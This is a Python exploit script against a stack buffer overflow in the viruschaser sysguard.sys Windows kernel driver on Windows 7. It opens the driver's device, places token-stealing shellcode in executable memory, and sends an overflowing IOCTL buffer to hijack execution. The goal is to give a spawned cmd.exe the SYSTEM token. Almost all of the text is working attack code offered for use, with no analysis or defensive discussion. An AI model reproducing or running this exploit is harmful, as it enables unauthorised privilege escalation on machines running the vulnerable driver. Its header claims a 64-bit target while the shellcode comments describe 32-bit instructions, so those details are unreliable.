# viruschaser sysguard.sys bufoverflow
# Stack buffer overflow exploit
# Target: Windows 7 SP1 64-bit
# Author: raycp

from ctypes import *
from ctypes.wintypes import *
import sys, struct, time

# Define constants
CREATE_NEW_CONSOLE = 0x00000010
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080
FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
HANDLE = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p

# Define WinAPI shorthand
CreateProcess = windll.kernel32.CreateProcessW # <-- Unicode version!
VirtualAlloc = windll.kernel32.VirtualAlloc
CreateFile = windll.kernel32.CreateFileW # <-- Unicode version!
DeviceIoControl = windll.kernel32.DeviceIoControl

class STARTUPINFO(Structure):
    """STARTUPINFO struct for CreateProcess API"""

    _fields_ = [("cb", DWORD),
                ("lpReserved", LPTSTR),
                ("lpDesktop", LPTSTR),
                ("lpTitle", LPTSTR),
                ("dwX", DWORD),
                ("dwY", DWORD),
                ("dwXSize", DWORD),
                ("dwYSize", DWORD),
                ("dwXCountChars", DWORD),
                ("dwYCountChars", DWORD),
                ("dwFillAttribute", DWORD),
                ("dwFlags", DWORD),
                ("wShowWindow", WORD),
                ("cbReserved2", WORD),
                ("lpReserved2", LPBYTE),
                ("hStdInput", HANDLE),
                ("hStdOutput", HANDLE),
                ("hStdError", HANDLE)]

class PROCESS_INFORMATION(Structure):
    """PROCESS_INFORMATION struct for CreateProcess API"""

    _fields_ = [("hProcess", HANDLE),
                ("hThread", HANDLE),
                ("dwProcessId", DWORD),
                ("dwThreadId", DWORD)]

def procreate():
    """Spawn shell and return PID"""

    print "[*]Spawning shell..."
    lpApplicationName = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpCommandLine = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = 0
    dwCreationFlags = CREATE_NEW_CONSOLE
    lpEnvironment = None
    lpCurrentDirectory = None
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()
    
    ret = CreateProcess(lpApplicationName,           # _In_opt_      LPCTSTR
                        lpCommandLine,               # _Inout_opt_   LPTSTR
                        lpProcessAttributes,         # _In_opt_      LPSECURITY_ATTRIBUTES
                        lpThreadAttributes,          # _In_opt_      LPSECURITY_ATTRIBUTES
                        bInheritHandles,             # _In_          BOOL
                        dwCreationFlags,             # _In_          DWORD
                        lpEnvironment,               # _In_opt_      LPVOID
                        lpCurrentDirectory,          # _In_opt_      LPCTSTR
                        byref(lpStartupInfo),        # _In_          LPSTARTUPINFO
                        byref(lpProcessInformation)) # _Out_         LPPROCESS_INFORMATION
    if not ret:
        print "\t[-]Error spawning shell: " + FormatError()
        sys.exit(-1)

    time.sleep(1) # Make sure cmd.exe spawns fully before shellcode executes

    print "\t[+]Spawned with PID: %d" % lpProcessInformation.dwProcessId
    return lpProcessInformation.dwProcessId

def gethandle():
    """Open handle to driver and return it"""

    print "[*]Getting device handle..."
    lpFileName = u"\\\\.\\SPIDER"
    dwDesiredAccess = GENERIC_READ | GENERIC_WRITE
    dwShareMode = 0
    lpSecurityAttributes = None
    dwCreationDisposition = OPEN_EXISTING
    dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    hTemplateFile = None

    handle = CreateFile(lpFileName,             # _In_     LPCTSTR
                        dwDesiredAccess,        # _In_     DWORD
                        dwShareMode,            # _In_     DWORD
                        lpSecurityAttributes,   # _In_opt_ LPSECURITY_ATTRIBUTES
                        dwCreationDisposition,  # _In_     DWORD
                        dwFlagsAndAttributes,   # _In_     DWORD
                        hTemplateFile)          # _In_opt_ HANDLE

    if not handle or handle == -1:
        print "\t[-]Error getting device handle: " + FormatError()
        sys.exit(-1)
        
    print "\t[+]Got device handle: 0x%x" % handle
    return handle

def ctl_code(function,
             devicetype = FILE_DEVICE_UNKNOWN,
             access = FILE_ANY_ACCESS,
             method = METHOD_NEITHER):
    """Recreate CTL_CODE macro to generate driver IOCTL"""
    return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def shellcode(pid):
    """Craft our shellcode and stick it in a buffer"""

    tokenstealing = (
        #---[Setup]
        "\x60"                      # pushad
        "\x64\xA1\x24\x01\x00\x00"  # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"  # mov ebx, [eax + TOKEN_OFFSET]
        #-- find cmd process"
        "\xBA"+ struct.pack("<I",pid) +  #mov edx,pid(CMD)
        "\x8B\x89\xB8\x00\x00\x00"  # mov ecx, [ecx + FLINK_OFFSET] <-|
        "\x81\xe9\xB8\x00\x00\x00"      # sub ecx, FLINK_OFFSET           |
        "\x39\x91\xB4\x00\x00\x00"  # cmp [ecx + PID_OFFSET], edx     |
        "\x75\xED"                  # jnz
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                  # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        
        "\x61"                      # popad
        "\x31\xC0"                  # NTSTATUS -> STATUS_SUCCESS
        "\x83\xc4\x24"
        "\x5d"                      #pop ebp
        "\xC2\x14\x00"              # ret 0x14
        
        ""
    )
                                        #    ret

    print "[*]Allocating buffer for shellcode..."
    lpAddress = None
    dwSize = len(tokenstealing)
    flAllocationType = (MEM_COMMIT | MEM_RESERVE)
    flProtect = PAGE_EXECUTE_READWRITE
    
    addr = VirtualAlloc(lpAddress,         # _In_opt_  LPVOID
                        0x2000,            # _In_      SIZE_T
                        flAllocationType,  # _In_      DWORD
                        flProtect)         # _In_      DWORD
    if not addr:
        print "\t[-]Error allocating shellcode: " + FormatError()
        sys.exit(-1)

    print "\t[+]Shellcode buffer allocated at: 0x%x" % addr
    
    # put de shellcode in de buffer and shake it all up
    print hex(addr)
    addr+=0x1234
    
    memmove(addr, tokenstealing, len(tokenstealing))
    return addr

def trigger(hDevice, dwIoControlCode, scAddr):
    """Create evil buffer and send IOCTL"""

    inBuffer = create_string_buffer("A" * (0xe0-4-2) + struct.pack("<I", scAddr))
    #evilbuf = create_string_buffer("A"*0x828+'1'*4+'2'*4)

    print "[*]Triggering vulnerable IOCTL..."
    lpInBuffer = addressof(inBuffer)
    nInBufferSize = len(inBuffer) # ignore terminating \x00
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None
    
    pwnd = DeviceIoControl(hDevice,             # _In_        HANDLE
                           dwIoControlCode,     # _In_        DWORD
                           lpInBuffer,          # _In_opt_    LPVOID
                           nInBufferSize,       # _In_        DWORD
                           lpOutBuffer,         # _Out_opt_   LPVOID
                           nOutBufferSize,      # _In_        DWORD
                           lpBytesReturned,     # _Out_opt_   LPDWORD
                           lpOverlapped)        # _Inout_opt_ LPOVERLAPPED
    if not pwnd:
        print "\t[-]Error: Not pwnd :(\n" + FormatError()
        sys.exit(-1)

if __name__ == "__main__":
    print "\n**viruschaser sysguard Vulnerable Driver**"
    print "***Stack buffer overflow exploit***\n"

    pid = procreate()
    trigger(gethandle(), 0x8c00201c, shellcode(pid)) # ugly lol
